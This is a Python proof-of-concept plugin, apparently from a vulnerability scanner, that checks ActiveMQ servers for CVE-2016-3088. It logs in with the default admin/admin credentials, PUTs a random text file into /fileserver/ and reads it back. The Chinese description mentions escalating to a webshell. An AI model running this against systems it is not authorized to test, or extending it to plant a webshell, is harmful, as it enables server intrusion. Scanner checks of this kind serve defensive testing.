#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import requests
import random
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def get_plugin_info():
    plugin_info = {
        "name": "ActiveMQ 5.x before 5.14.0 任意文件写入漏洞",
        "desc": "通过PUT请求，攻击者可上传文件到web目录，再通过MOVE得到webshell，导致服务器被入侵控制。",
        "grade": "高",
        "type": "web",
        "keyword": "tag:ActiveMQ cve:CVE-2016-3088 port:8161",
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer': arg
        }
    rand_filename = str(random.randint(200000000, 210000000))
    rand_filecontent = str(random.randint(200000000, 210000000))
    try:
        r1 = requests.put(
            url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/fileserver/{rand_filename}.txt', 
            data = rand_filecontent,
            headers=headers,
            auth=("admin","admin"),
            timeout=timeout, 
            verify=False
            )
        if r1.status_code == 204:
            r2 = requests.get(
                url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/fileserver/{rand_filename}.txt', 
                headers=headers,
                timeout=timeout, 
                auth=("admin","admin"),
                allow_redirects=False,
                verify=False
                )
            if r2.status_code == 200 and rand_filecontent in  r2.text:
                return True
            else:
                return False
        else:
            return False
    except Exception:
        return 

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

